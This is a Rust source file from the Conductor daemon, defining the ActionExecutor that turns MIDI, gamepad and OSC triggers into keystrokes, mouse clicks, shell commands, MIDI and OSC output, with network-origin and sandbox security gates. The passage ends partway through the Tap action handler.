// Copyright 2025 Amiable
// SPDX-License-Identifier: MIT

//! Action execution implementation for Conductor daemon.
//!
//! This module contains the ActionExecutor which is responsible for executing
//! actions (keyboard, mouse, shell commands, etc.) on the host system.
//!
//! This was moved from conductor-core to maintain architectural purity:
//! - Core: Pure data structures and logic (UI-independent)
//! - Daemon: System interaction (keyboard, mouse, shell, etc.)
//!
//! ## Module layout (#1684)
//!
//! The executor grew past the LLM Council `verify` size ceiling, so the
//! per-action implementations live in cohesive submodules; `mod.rs` keeps
//! the `ActionExecutor` struct, its constructors/accessors, and the
//! top-level `execute` dispatch match:
//! - [`input_sim`] — keyboard/mouse simulation (`execute_keystroke`, enigo helpers)
//! - [`shell`] — shell execution + argv parsing + env sanitiser
//! - [`midi`] — MIDI output byte computation + `SendMidi`
//! - [`launch`] — application launching
//! - [`osc`] — OSC send
//! - [`volume`] — system volume control

use crate::conditions::{ConditionContext, evaluate_condition};
use crate::daemon::keystroke_policy;
use crate::plugin_manager::PluginManager;
use arc_swap::ArcSwap;
use conductor_core::dispatch::{DispatchError, DispatchOutcome, DispatchResult};
use conductor_core::{Action, MidiOutputManager};
use enigo::{Coordinate, Direction, Enigo, Keyboard, Mouse};
use std::collections::HashMap;
use std::sync::Arc;
use std::thread;
use std::time::Duration;

mod input_sim;
mod launch;
mod midi;
mod osc;
mod persistence_veto;
mod sandbox;
mod shell;
mod volume;

use input_sim::to_enigo_button;
use volume::execute_volume_control;

// Public API re-exports — these MUST stay reachable at
// `crate::action_executor::<name>` (lib.rs re-exports them and external
// callers / tests import them by these paths).
pub use midi::{compute_midi_forward_bytes, compute_midi_output_bytes};
pub use shell::{derive_shell_argv, parse_command_line};

/// Context about the triggering event passed to action execution
///
/// This struct carries information from the triggering MIDI event (e.g., velocity)
/// and current system state (e.g., active mode) that may be needed during action execution,
/// particularly for SendMIDI actions with velocity mapping and Conditional actions.
#[derive(Debug, Clone, Default)]
pub struct TriggerContext {
    /// Velocity of the triggering MIDI event (0-127)
    ///
    /// For NoteOn events, this is the velocity of the note press.
    /// For NoteOff events, this is typically 64 (MIDI standard release velocity).
    /// For other events, this may be None or a default value.
    pub velocity: Option<u8>,

    /// Current active mode name
    ///
    /// Used by Conditional actions with ModeIs conditions to check if a condition
    /// should execute based on the current mode.
    pub current_mode: Option<String>,

    /// Raw MIDI bytes from the triggering event (v4.25.0 - ADR-009 Gap 2)
    ///
    /// Used by MidiForward actions to pass the original MIDI data through
    /// a transform pipeline to an output port.
    pub raw_midi: Option<Vec<u8>>,

    /// Device alias of the originating device (ADR-021 Phase 2A)
    ///
    /// Used by MidiForward with `_source` target to resolve the originating
    /// device's output port for echo-back.
    pub device_id: Option<String>,

    /// The structured input event that satisfied the mapping's trigger
    /// (ADR-039-B #1762 step 4b).
    ///
    /// Used by `HidForward`, which translates the *original* gamepad event to
    /// the target protocol — `raw_midi` is lossy for HID (gamepad button 128
    /// serializes to MIDI note 0), so the structured event must be carried.
    /// Populated on the gamepad dispatch path; `None` for MIDI-sourced and
    /// synthetic contexts (config-load validation rejects `HidForward` on any
    /// non-HID-triggered mapping, so a `None` here cannot reach `HidForward`
    /// in a valid config).
    pub input_event: Option<conductor_core::events::InputEvent>,

    /// The decoded inbound OSC message that satisfied the mapping's trigger
    /// (ADR-039-A Slice 3, #2326).
    ///
    /// Used by `OscForward`, which re-sends this message to an OSC output
    /// endpoint. Populated only on the OSC dispatch path (`process_osc_event`);
    /// `None` for MIDI/HID/synthetic contexts. `OscForward` returns a no-op
    /// when it is `None` (a non-OSC-triggered mapping), mirroring `HidForward`.
    pub osc_message: Option<conductor_core::events::OscInbound>,
}

impl TriggerContext {
    /// Create a new trigger context with velocity
    pub fn with_velocity(velocity: u8) -> Self {
        Self {
            velocity: Some(velocity),
            ..Default::default()
        }
    }

    /// Create a new trigger context with velocity and mode
    pub fn with_velocity_and_mode(velocity: u8, mode: String) -> Self {
        Self {
            velocity: Some(velocity),
            current_mode: Some(mode),
            ..Default::default()
        }
    }

    /// Create a new trigger context with mode only
    pub fn with_mode(mode: String) -> Self {
        Self {
            current_mode: Some(mode),
            ..Default::default()
        }
    }

    /// Get velocity or default to 100 (standard MIDI default)
    pub fn velocity_or_default(&self) -> u8 {
        self.velocity.unwrap_or(100)
    }
}

/// ActionExecutor handles the execution of actions on the host system.
///
/// This includes:
/// - Keyboard simulation via enigo
/// - Mouse simulation via enigo
/// - Shell command execution
/// - Application launching
/// - Volume control
/// - MIDI output (v2.1)
///
/// # Architecture Note
/// This executor lives in the daemon layer (not core) because it interacts
/// with the operating system through UI libraries (enigo) and system commands.
pub struct ActionExecutor {
    enigo: Option<Enigo>,
    midi_output: MidiOutputManager,
    plugin_manager: PluginManager,
    /// Device alias → output port name map (ADR-021 Phase 2A)
    /// Shared via ArcSwap for lock-free reads; updated by engine_manager on reload/hot-plug.
    device_output_map: Arc<ArcSwap<HashMap<String, String>>>,
    /// Physical control state store (ADR-025 Phase 2).
    /// Threaded through ConditionContext so `Conditional` actions can
    /// evaluate `ActivePcIs` / `CcValueInRange` / `NoteHeld`.
    /// `None` for test construction paths that don't exercise state
    /// conditions; production always sets this from `EngineManager`.
    control_state: Option<Arc<conductor_core::control_state::PhysicalControlStateStore>>,
    /// ADR-025 Phase 3.A: breadcrumbs collected during the current
    /// top-level dispatch. The executor pushes entries as it resolves
    /// state-bearing routes (ContextSwitchTable branches, state-
    /// condition matches); the worker drains the whole vec via
    /// `take_routing_trace` after `execute` returns and attaches it
    /// to the completion so the Events panel can render
    /// "via PC 12 → volume" on the row.
    ///
    /// Drained after every top-level dispatch by the worker's
    /// post-execute `take_routing_trace` call in
    /// `ExecutorWorker::execute_dispatch` — including on error /
    /// cancelled paths — so a failed dispatch can't leak breadcrumbs
    /// into the next one.
    routing_trace: Vec<String>,
    /// Issue #555: output-port names for every successful MIDI emission
    /// during the current top-level dispatch. Drained at the end of
    /// `ExecutorWorker::execute_dispatch` and attached to the
    /// completion so `EngineManager::handle_action_completion` can open
    /// per-port cascade-suppression windows.
    ///
    /// Captured INSIDE `execute_send_midi` and the `MidiForward`
    /// handler — not at the top level — so:
    /// - Wrapper actions (`Sequence`, `Repeat`, `Conditional`,
    ///   `ContextSwitchTable`) that nest a MIDI send still record the
    ///   port (Copilot review on PR #1211).
    /// - `MidiForward { target: "_source" }` records the *resolved*
    ///   port (post-`resolve_source_output`), not the literal
    ///   `"_source"` magic placeholder.
    ///
    /// Empty for failed sends — same conservatism as `sent_midi`.
    sent_ports: Vec<String>,
    /// ADR-027 D8: enforces the keystroke policy (deny-list +
    /// rate limit) before each `Action::Keystroke` reaches enigo.
    /// Defaults to `Standard`; `Unrestricted` is configurable but
    /// emits a startup warning at the daemon level (callers).
    keystroke_policy: keystroke_policy::KeystrokePolicyEnforcer,
    /// ADR-042 D17: network-origin taint for the in-flight dispatch.
    /// `Some(listener_alias)` while executing an action that originated from a
    /// network listener (incl. loopback OSC/Art-Net); `None` for MIDI/gamepad.
    /// The gate at [`Self::execute`] entry consults it. **Phase A: always `None`**
    /// — there is no network→action path until ADR-039 seeds
    /// `ActionEnvelope.network_origin` and the executor worker threads it here.
    current_network_origin: Option<String>,
    /// ADR-027 §D10b: global shell-sandbox policy. When `false`, a shell
    /// action that cannot be OS-sandboxed (Windows, Linux < 5.13 without
    /// Landlock) is refused (fail-closed) rather than spawned unconfined.
    /// Defaults to `true` (spawn with a warning); set from
    /// `[security.shell]` by `EngineManager`.
    shell_allow_unsandboxed: bool,
    /// #2396 / ADR-015 D2 (revised) + ADR-021 D4: read-mostly dispatch config
    /// shared lock-free with EngineManager via a SINGLE `ArcSwap` (see
    /// [`SharedActionConfig`]). Holds the OSC output endpoints (#2326) and the
    /// ADR-042 D17 per-listener `allow_sensitive_actions` map. CRITICAL: this is
    /// the SAME `Arc` held by EngineManager and by BOTH `ActionExecutor`
    /// instances (the dispatch-thread executor and the mutex-guarded
    /// plugin/probe executor), so a single `store` is visible to the dispatch
    /// path — the bug #2396 fixed was setting these on the non-dispatching
    /// executor's own (now-removed) owned fields. Bundled into one struct so the
    /// two maps update atomically (no cross-map torn read).
    shared_config: Arc<ArcSwap<SharedActionConfig>>,
}

/// #2396 / ADR-015 D2 (revised): read-mostly executor config propagated to the
/// dispatch thread lock-free via `Arc<ArcSwap<SharedActionConfig>>` (the
/// ADR-021 D4 pattern, already used for `device_output_map`). One struct so the
/// two maps swap atomically. Virtual-port NAMES do NOT live here — creating OS
/// ports is a thread-affine side effect, propagated via a `watch` channel and
/// applied between actions on the executor thread (see `executor_thread`).
#[derive(Debug, Clone, Default)]
pub struct SharedActionConfig {
    /// ADR-042 D17 (Slice A.6.6): per-network-listener `allow_sensitive_actions`
    /// (alias → bool). A missing alias reads as `false` (DENY). Empty = no
    /// network listeners (and the fail-safe default until config lands).
    pub network_sensitive_allow: HashMap<String, bool>,
    /// ADR-039-A Slice 3 (#2326): OSC **output** endpoints (alias → (host,
    /// port)). `OscForward` resolves its target alias here. Missing = dispatch
    /// error.
    pub osc_output_endpoints: HashMap<String, (String, u16)>,
}

impl Default for ActionExecutor {
    fn default() -> Self {
        Self::new(Arc::new(ArcSwap::from_pointee(HashMap::new())))
    }
}

impl ActionExecutor {
    /// Create a new ActionExecutor with a shared device output map.
    /// `control_state` is populated separately via [`with_control_state`].
    pub fn new(device_output_map: Arc<ArcSwap<HashMap<String, String>>>) -> Self {
        Self {
            enigo: None,
            midi_output: MidiOutputManager::new(),
            plugin_manager: PluginManager::default(),
            device_output_map,
            control_state: None,
            routing_trace: Vec::new(),
            sent_ports: Vec::new(),
            keystroke_policy: keystroke_policy::KeystrokePolicyEnforcer::standard(),
            current_network_origin: None,
            shell_allow_unsandboxed: true,
            // Defaults to a private empty config (DENY). The production path
            // attaches the SHARED config via `with_shared_action_config` so the
            // dispatch executor and EngineManager observe the same updates
            // (#2396). Tests that don't wire sharing keep the fail-safe default.
            shared_config: Arc::new(ArcSwap::from_pointee(SharedActionConfig::default())),
        }
    }

    /// #2396: attach the SHARED read-mostly config `ArcSwap` (OSC endpoints +
    /// D17 allow-map). Builder mirror of [`Self::with_control_state`]; the
    /// production daemon passes the same `Arc` here that EngineManager `store`s
    /// to, so config reaches the dispatch-thread executor (ADR-015 D2 revised /
    /// ADR-021 D4).
    #[must_use]
    pub fn with_shared_action_config(
        mut self,
        shared_config: Arc<ArcSwap<SharedActionConfig>>,
    ) -> Self {
        self.shared_config = shared_config;
        self
    }

    /// ADR-027 §D10b — apply the loaded `[security.shell]` policy. Called by
    /// `EngineManager` after config load / reload.
    pub fn set_shell_security(&mut self, cfg: &conductor_core::config::types::ShellSecurityConfig) {
        self.shell_allow_unsandboxed = cfg.allow_unsandboxed;
    }

    /// Test-only read of the current shell-sandbox policy. Used by
    /// `#2100` atomicity tests to assert a rejected config commit does not
    /// mutate the executor's policy.
    #[cfg(test)]
    pub(crate) fn shell_allow_unsandboxed(&self) -> bool {
        self.shell_allow_unsandboxed
    }

    /// Builder variant of [`set_shell_security`] for the construction chain.
    #[must_use]
    pub fn with_shell_security(
        mut self,
        cfg: &conductor_core::config::types::ShellSecurityConfig,
    ) -> Self {
        self.set_shell_security(cfg);
        self
    }

    /// ADR-042 D17 (Slice A.6.6): set the per-listener `allow_sensitive_actions`
    /// map. #2396: stores into the SHARED `ArcSwap` so the dispatch-thread
    /// executor sees it. Production drives this via EngineManager's
    /// `store_shared_action_config` (single atomic store of both maps); this
    /// per-field setter is retained for test ergonomics and does a
    /// read-clone-store (NOT atomic with the OSC map — fine for tests / when
    /// only one map changes).
    pub fn set_network_sensitive_allow(&mut self, map: HashMap<String, bool>) {
        let mut cfg = (**self.shared_config.load()).clone();
        cfg.network_sensitive_allow = map;
        self.shared_config.store(Arc::new(cfg));
    }

    /// ADR-039-A Slice 3 (#2326): set the OSC output endpoint map
    /// (alias → (host, port)) used by `OscForward`. #2396: stores into the
    /// SHARED `ArcSwap` (see [`Self::set_network_sensitive_allow`]).
    pub fn set_osc_output_endpoints(&mut self, map: HashMap<String, (String, u16)>) {
        let mut cfg = (**self.shared_config.load()).clone();
        cfg.osc_output_endpoints = map;
        self.shared_config.store(Arc::new(cfg));
    }

    /// ADR-042 D17: set (or clear with `None`) the network-origin taint for the
    /// next dispatch. The executor worker sets this from the dispatch before
    /// `execute` and clears it after.
    pub fn set_network_origin(&mut self, origin: Option<String>) {
        self.current_network_origin = origin;
    }

    /// ADR-042 D17 action-class gate. When the in-flight dispatch is
    /// network-tainted and `action` is — or statically nests — a sensitive class
    /// (`Shell` / `Launch` / `Keystroke`), refuse unless the origin listener set
    /// `allow_sensitive_actions = true`. Pure decision (no side effects) so the
    /// whole envelope is rejected **up front**, before any partial execution.
    /// MIDI / gamepad origins (`network_origin == None`) are never gated.
    fn check_action_class_gate(&self, action: &Action) -> Result<(), DispatchError> {
        let Some(origin) = self.current_network_origin.as_deref() else {
            return Ok(());
        };
        if !action.contains_sensitive_action() {
            return Ok(());
        }
        let allowed = self
            .shared_config
            .load()
            .network_sensitive_allow
            .get(origin)
            .copied()
            .unwrap_or(false);
        if allowed {
            Ok(())
        } else {
            Err(DispatchError::NetworkActionClassBlocked {
                listener: origin.to_string(),
            })
        }
    }

    /// Replace the keystroke policy enforcer. Tests use this to
    /// inject `KeystrokePolicy::Unrestricted` or to verify the
    /// deny-list path; production callers can override via the
    /// `[security.keystroke]` config field once D5/D3 surface it.
    pub fn with_keystroke_policy(
        mut self,
        enforcer: keystroke_policy::KeystrokePolicyEnforcer,
    ) -> Self {
        self.keystroke_policy = enforcer;
        self
    }

    /// Take ownership of the accumulated routing trace, leaving the
    /// executor's internal vec empty for the next top-level dispatch.
    /// See [`routing_trace`](Self#structfield.routing_trace) for
    /// details on what entries represent.
    pub fn take_routing_trace(&mut self) -> Vec<String> {
        std::mem::take(&mut self.routing_trace)
    }

    /// Take ownership of the output ports written to during the current
    /// top-level dispatch (issue #555). See
    /// [`sent_ports`](Self#structfield.sent_ports) for what entries
    /// represent and why they are captured here rather than at the
    /// top level.
    pub fn take_sent_ports(&mut self) -> Vec<String> {
        std::mem::take(&mut self.sent_ports)
    }

    /// Attach a physical control-state store (ADR-025 Phase 2).
    /// `Conditional` actions with `ActivePcIs`, `CcValueInRange`, or
    /// `NoteHeld` conditions evaluate against this store.
    pub fn with_control_state(
        mut self,
        store: Arc<conductor_core::control_state::PhysicalControlStateStore>,
    ) -> Self {
        self.control_state = Some(store);
        self
    }

    /// Resolve a port string — checks device aliases first, falls back to raw port name.
    fn resolve_output_port(&self, port_or_alias: &str) -> String {
        let map = self.device_output_map.load();
        map.get(port_or_alias)
            .cloned()
            .unwrap_or_else(|| port_or_alias.to_string())
    }

    /// Resolve `_source` target to the originating device's output port.
    fn resolve_source_output(&self, device_id: &str) -> Result<String, DispatchError> {
        let map = self.device_output_map.load();
        map.get(device_id)
            .cloned()
            .ok_or_else(|| DispatchError::TargetNotBound(
                format!("Device '{}' has no output port — configure [output] matchers or verify auto-pairing", device_id)
            ))
    }

    /// Returns the names of all virtual MIDI output ports.
    ///
    /// Used to auto-exclude these ports from input scanning (ADR-009 D21).
    pub fn virtual_port_names(&self) -> Vec<String> {
        self.midi_output.virtual_port_names()
    }

    /// Reconcile the OS virtual MIDI ports to `desired` (#2063).
    ///
    /// Delegates to [`MidiOutputManager::sync_virtual_ports`]: creates the
    /// declared `MidiVirtualPort` endpoints as real OS ports and tears down any
    /// that are no longer configured. The `MidiOutputManager` owns the port
    /// connections, so this must go through the executor (which holds it).
    /// Infallible — partial failures are reported in the returned
    /// [`VirtualPortSync`], never raised, so a reload's APPLY phase can't fail.
    pub fn sync_virtual_ports(
        &mut self,
        desired: &[String],
    ) -> conductor_core::midi_output::VirtualPortSync {
        self.midi_output.sync_virtual_ports(desired)
    }

    /// Get a reference to the plugin manager
    ///
    /// Allows external code to manage plugins (discover, load, configure permissions)
    pub fn plugin_manager(&self) -> &PluginManager {
        &self.plugin_manager
    }

    /// Send a raw byte sequence via the action executor's MidiOutputManager.
    ///
    /// Used by ADR-026 Phase 2's SysEx Identity probe: the daemon's
    /// `EngineManager::run_probe_device_identity` calls this to write the
    /// 6-byte Universal Identity Request to a paired output port. Auto-
    /// connects if the port isn't already open (mirroring `execute_send_midi`).
    pub fn send_raw_bytes(&mut self, port: &str, bytes: &[u8]) -> Result<(), String> {
        self.midi_output
            .connect_by_name(port)
            .map_err(|e| format!("Failed to connect to port '{}': {}", port, e))?;
        self.midi_output
            .send_message(port, bytes)
            .map_err(|e| format!("Failed to send to '{}': {}", port, e))
    }

    /// Get a mutable reference to the plugin manager
    ///
    /// Allows external code to manage plugins (discover, load, configure permissions)
    pub fn plugin_manager_mut(&mut self) -> &mut PluginManager {
        &mut self.plugin_manager
    }

    /// Execute an action, returning a structured result (v4.25.0 - ADR-009 Gap 1)
    ///
    /// Returns `DispatchResult` so the caller (engine manager) can handle
    /// mode changes and errors appropriately instead of relying on side effects.
    ///
    /// # Arguments
    /// * `action` - The action to execute
    /// * `context` - Optional context about the triggering event (e.g., velocity)
    pub fn execute(&mut self, action: Action, context: Option<TriggerContext>) -> DispatchResult {
        // ADR-042 D17 (Slice A.6.6): refuse a sensitive action class from a
        // network-tainted origin up front, before any (partial) execution.
        // Runs before the ADR-027 tier gate. No-op for MIDI/gamepad origins.
        self.check_action_class_gate(&action)?;
        match action {
            Action::Keystroke { keys, modifiers } => {
                self.execute_keystroke(keys, modifiers)?;
                Ok(DispatchOutcome::Completed)
            }
            Action::Text(text) => {
                self.get_enigo()?
                    .text(&text)
                    .map_err(|e| DispatchError::OsAutomation(e.to_string()))?;
                Ok(DispatchOutcome::Completed)
            }
            Action::Launch(app) => {
                // #938: propagate launch failures so the dispatch outcome
                // reflects reality. Pre-fix this always reported Completed
                // even when the app failed to launch.
                self.launch_app(&app)?;
                Ok(DispatchOutcome::Completed)
            }
            Action::Shell {
                command,
                args,
                timeout_ms,
                sandbox,
            } => {
                self.execute_shell(&command, args.as_deref(), timeout_ms, sandbox.as_ref())?;
                Ok(DispatchOutcome::Completed)
            }
            Action::Sequence(actions) => {
                for act in actions {
                    let result = self.execute(act, context.clone())?;
                    // Propagate ModeChange from inner actions
                    if let DispatchOutcome::ModeChangeRequested { .. } = &result {
                        return Ok(result);
                    }
                    thread::sleep(Duration::from_millis(50));
                }
                Ok(DispatchOutcome::Completed)
            }
            Action::Delay(ms) => {
                thread::sleep(Duration::from_millis(ms));
                Ok(DispatchOutcome::Completed)
            }
            Action::MouseClick { button, x, y } => {
                let enigo = self.get_enigo()?;
                if let (Some(x), Some(y)) = (x, y) {
                    enigo
                        .move_mouse(x, y, Coordinate::Abs)
                        .map_err(|e| DispatchError::OsAutomation(e.to_string()))?;
                }
                let enigo_button = to_enigo_button(button);
                enigo
                    .button(enigo_button, Direction::Click)
                    .map_err(|e| DispatchError::OsAutomation(e.to_string()))?;
                Ok(DispatchOutcome::Completed)
            }
            Action::Repeat {
                action,
                count,
                delay_ms,
            } => {
                for i in 0..count {
                    let result = self.execute((*action).clone(), context.clone())?;
                    if let DispatchOutcome::ModeChangeRequested { .. } = &result {
                        return Ok(result);
                    }

                    // Add delay between iterations (but not after the last one)
                    if i < count - 1
                        && let Some(delay) = delay_ms
                    {
                        thread::sleep(Duration::from_millis(delay));
                    }
                }
                Ok(DispatchOutcome::Completed)
            }
            Action::Conditional {
                condition,
                then_action,
                else_action,
            } => {
                // Build condition context: mode from trigger context (for
                // ModeIs) + control-state store from the executor (for
                // ADR-025 state conditions ActivePcIs / CcValueInRange /
                // NoteHeld). Either or both may be None in test paths.
                let mut cond_ctx = ConditionContext::default();
                if let Some(ctx) = context.as_ref()
                    && let Some(mode) = ctx.current_mode.as_ref()
                {
                    cond_ctx.current_mode = Some(mode.clone());
                }
                if let Some(state) = self.control_state.as_ref() {
                    cond_ctx.state = Some(Arc::clone(state));
                }

                let matched = evaluate_condition(&condition, Some(&cond_ctx));
                if matched {
                    // ADR-025 Phase 3.A: when a state-bearing
                    // condition drove the match, record why — this
                    // is the Conditional-chain equivalent of the
                    // `ContextSwitchTable` trace below, so lowered
                    // PcContextSwitch / CcContextSwitch configs
                    // (≤MAX_LINEAR_BRANCHES branches) surface the
                    // same "via ..." breadcrumb as the oversize
                    // variant.
                    if let Some(entry) = routing_trace_from_condition(&condition) {
                        self.routing_trace.push(entry);
                    }
                    self.execute((*then_action).clone(), context.clone())
                } else if let Some(else_act) = else_action {
                    self.execute((*else_act).clone(), context)
                } else {
                    Ok(DispatchOutcome::Completed)
                }
            }
            // ADR-025 Phase 2.F: context-switch table dispatch.
            //
            // Read current physical state from the store, look up the
            // matching branch by PC (HashMap, O(1)) or CC range (linear
            // scan, first-match-wins). Absent state / no matching
            // branch → execute `default` if present, otherwise no-op.
            //
            // Range overlap within a CC table is possible in today's
            // config surface — structural overlap detection is the
            // validator work in task #26. Until that lands, first-
            // match-wins in authoring order is the observable contract.
            //
            // The lookup reuses `PhysicalControlStateStore` so the same
            // store that `Condition::ActivePcIs` / `CcValueInRange`
            // reads from is also the authority here — keeping the
            // single-state-reality invariant from ADR-025 D2.
            Action::ContextSwitchTable {
                kind,
                channel,
                device,
                branches,
                default,
                source,
            } => {
                use conductor_core::actions::{ContextBranchTable, ContextKind};
                use conductor_core::control_state::StateKey;

                let Some(store) = self.control_state.as_ref() else {
                    // No store wired (test paths). Execute default if
                    // present, otherwise no-op — matching the
                    // "absence → false" rule on the Condition side.
                    tracing::debug!(
                        "ContextSwitchTable dispatched without a control_state store; \
                         executing default action or no-op."
                    );
                    return match default {
                        Some(d) => self.execute(*d, context),
                        None => Ok(DispatchOutcome::Completed),
                    };
                };

                // Consume `branches` and `device` by value so we can
                // `remove` owned entries from the PC map / `find_map`
                // the CC ranges without cloning the inner `Box<Action>`.
                //
                // `trace_entry` captures the routing breadcrumb (ADR-025
                // Phase 3.A) — we can't write to `self.routing_trace`
                // from inside the match because `store` borrows
                // `self.control_state`. We build the string here and
                // push it after the match closes.
                let mut trace_entry: Option<String> = None;
                let branch: Option<Box<Action>> = match (kind, branches) {
                    (ContextKind::Pc, ContextBranchTable::Pc(mut map)) => {
                        let device_for_trace = device.clone();
                        let key = StateKey::ProgramChange { device, channel };
                        let observed = store.get(&key).map(|cv| cv.value as u8);
                        observed.and_then(|pc| {
                            // Only format the breadcrumb when the
                            // observed PC actually has a matching
                            // branch — a PC observed without a table
                            // entry falls through to the default and
                            // isn't a state-routed path worth tracing.
                            map.remove(&pc).inspect(|_| {
                                trace_entry = Some(format!(
                                    "PC {pc} on {device_for_trace} ch{}",
                                    channel.saturating_add(1),
                                ));
                            })
                        })
                    }
                    (ContextKind::Cc, ContextBranchTable::Cc { cc, ranges }) => {
                        let device_for_trace = device.clone();
                        let key = StateKey::ControlChange {
                            device,
                            channel,
                            cc,
                        };
                        store.get(&key).and_then(|cv| {
                            let v = cv.value as u8;
                            ranges.into_iter().find_map(|(min, max, action)| {
                                if v >= min && v <= max {
                                    trace_entry = Some(format!(
                                        "CC {cc}={v} ∈ [{min}, {max}] on {device_for_trace} ch{}",
                                        channel.saturating_add(1),
                                    ));
                                    Some(action)
                                } else {
                                    None
                                }
                            })
                        })
                    }
                    // kind / branches mismatch — a lowering bug, not a
                    // user error. Include the kind, branch variant,
                    // and lowering origin so the caller can locate the
                    // malformed Action in the source config.
                    (k, b) => {
                        let branch_variant = match b {
                            ContextBranchTable::Pc(_) => "Pc",
                            ContextBranchTable::Cc { .. } => "Cc",
                        };
                        tracing::warn!(
                            kind = ?k,
                            branches = branch_variant,
                            channel,
                            origin = %source.origin,
                            branch_index = ?source.branch_index,
                            "ContextSwitchTable kind/branches mismatch — lowering bug"
                        );
                        None
                    }
                };

                // Record the breadcrumb after the match releases the
                // store borrow. We only trace when a branch actually
                // fired via the observed-state path — falling through
                // to the `default` on no-observed-state or on a
                // kind/branch mismatch emits no trace entry, matching
                // the "via ..." UI contract (the default isn't "via
                // PC 12"; it's just the default).
                if branch.is_some()
                    && let Some(entry) = trace_entry
                {
                    self.routing_trace.push(entry);
                }

                match branch {
                    Some(action) => self.execute(*action, context),
                    None => match default {
                        Some(d) => self.execute(*d, context),
                        None => Ok(DispatchOutcome::Completed),
                    },
                }
            }
            Action::VolumeControl { operation, value } => {
                execute_volume_control(&operation, &value);
                Ok(DispatchOutcome::Completed)
            }
            Action::ModeChange { mode } => {
                // Return ModeChangeRequested so the engine manager can update ArcSwap<ModeState>
                Ok(DispatchOutcome::ModeChangeRequested { mode })
            }
            Action::SendMidi {
                port,
                message_type,
                channel,
                params,
            } => {
                let resolved_port = self.resolve_output_port(&port);
                self.execute_send_midi(
                    &resolved_port,
                    &message_type,
                    channel,
                    &params,
                    context.as_ref(),
                )?;
                Ok(DispatchOutcome::Completed)
            }
            Action::MidiForward { target, transform } => {
                let raw = context
                    .as_ref()
                    .and_then(|c| c.raw_midi.as_ref())
                    .ok_or_else(|| {
                        DispatchError::MidiOutput(
                            "MidiForward requires raw MIDI bytes in trigger context".into(),
                        )
                    })?;

                // ADR-021 Phase 2A: Resolve target — _source echo-back or alias lookup
                let resolved_target = if target == "_source" {
                    let device_id = context
                        .as_ref()
                        .and_then(|c| c.device_id.as_deref())
                        .ok_or_else(|| {
                            DispatchError::TargetNotBound(
                                "MidiForward target '_source' requires device context (multi-device mode)".into(),
                            )
                        })?;
                    self.resolve_source_output(device_id)?
                } else {
                    self.resolve_output_port(&target)
                };

                let output = match transform {
                    Some(t) => t.apply(raw),
                    None => raw.clone(),
                };

                self.midi_output
                    .connect_by_name(&resolved_target)
                    .map_err(|e| {
                        DispatchError::MidiOutput(format!(
                            "Failed to connect to port '{}': {}",
                            resolved_target, e
                        ))
                    })?;
                self.midi_output
                    .send_message(&resolved_target, &output)
                    .map_err(|e| {
                        DispatchError::MidiOutput(format!(
                            "Failed to send to '{}': {}",
                            resolved_target, e
                        ))
                    })?;

                // Issue #555: record the *resolved* port (post
                // `_source` resolution) so cascade suppression opens a
                // window for the actual output port, not the literal
                // `"_source"` placeholder.
                self.sent_ports.push(resolved_target);

                Ok(DispatchOutcome::Completed)
            }
            Action::HidForward { target, transform } => {
                // ADR-039-B #1762 step 4b. Translate the *structured* gamepad
                // event that fired this mapping to MIDI and send it to the
                // target output port. V1 supports HidToMidi → MIDI only
                // (config-load validation rejects other variants / non-MIDI
                // targets and gates this action to HID-triggered mappings, so
                // `input_event` is present in a valid config).
                let event = context
                    .as_ref()
                    .and_then(|c| c.input_event.as_ref())
                    .ok_or_else(|| {
                        DispatchError::MidiOutput(
                            "HidForward requires the structured gamepad event in trigger context \
                             (HID-triggered mapping)"
                                .into(),
                        )
                    })?;

                // Apply the HID→MIDI transform. `None` means the event didn't
                // resolve to a mapped trigger (or wasn't a gamepad event) — a
                // benign no-op for this dispatch, mirroring the route skip.
                let Some(bytes) = crate::transforms::hid_to_midi::apply(&transform, event) else {
                    return Ok(DispatchOutcome::Completed);
                };

                let resolved_target = self.resolve_output_port(&target);
                self.midi_output
                    .connect_by_name(&resolved_target)
                    .map_err(|e| {
                        DispatchError::MidiOutput(format!(
                            "Failed to connect to port '{}': {}",
                            resolved_target, e
                        ))
                    })?;
                self.midi_output
                    .send_message(&resolved_target, &bytes)
                    .map_err(|e| {
                        DispatchError::MidiOutput(format!(
                            "Failed to send to '{}': {}",
                            resolved_target, e
                        ))
                    })?;
                self.sent_ports.push(resolved_target);

                Ok(DispatchOutcome::Completed)
            }
            Action::Plugin { plugin, params } => {
                // Convert TriggerContext from daemon to plugin TriggerContext
                let plugin_context = context.as_ref().map(|ctx| {
                    conductor_core::plugin::TriggerContext {
                        velocity: ctx.velocity,
                        current_mode: None, // TODO: Convert mode name to index
                        timestamp: std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap()
                            .as_millis() as u64,
                    }
                });

                // Execute plugin
                self.plugin_manager
                    .execute_plugin(&plugin, params, plugin_context)
                    .map_err(|e| DispatchError::Plugin(format!("{}: {}", plugin, e)))?;
                Ok(DispatchOutcome::Completed)
            }
            Action::OscSend {
                host,
                port,
                address,
                args,
            } => {
                self.execute_osc_send(&host, port, &address, &args)?;
                Ok(DispatchOutcome::Completed)
            }
            // ADR-039-A Slice 3 (#2326): re-send the inbound OSC message to an
            // OSC output endpoint by alias. V1 is pass-through (transform is
            // validated `None` at config-load). The inbound message rides the
            // trigger context; absent it (a non-OSC-triggered mapping — which
            // config-load does not forbid, matching HidForward) this is a
            // benign no-op rather than an error.
            Action::OscForward { target, .. } => {
                let Some(osc) = context.as_ref().and_then(|c| c.osc_message.as_ref()) else {
                    // No inbound OSC in context → nothing to forward. Mirrors
                    // HidForward's "no structured event" skip.
                    return Ok(DispatchOutcome::Completed);
                };
                // #2396: read from the shared ArcSwap; clone the (host, port)
                // out so the load guard drops before the UDP send.
                let endpoint = self
                    .shared_config
                    .load()
                    .osc_output_endpoints
                    .get(&target)
                    .cloned();
                let Some((host, port)) = endpoint else {
                    return Err(DispatchError::OscSend(format!(
                        "OscForward target '{}' is not a known OSC output endpoint",
                        target
                    )));
                };
                self.execute_osc_send(&host, port, &osc.address, &osc.args)?;
                Ok(DispatchOutcome::Completed)
            }
            // ADR-038 observation action (Slice 4). Substitute
            // `{note}`/`{velocity}`/`{cc}`/`{value}` from the triggering event
            // via the shared `midi_template` helper (no drift with MidiToOsc —
            // R2 P5), then emit the rendered message as a routing-trace
            // breadcrumb (the same channel the Events panel reads). Otherwise
            // side-effect-free; the let-through fan-out to routes is the pump's
            // job (Slice 3 `RouteDisposition::LetThrough`).
            Action::Tap { message } => {
                let pairs = tap_substitution_pairs(context.as_ref());
                let rendered = crate::midi_template::substitute(&message, &pairs);
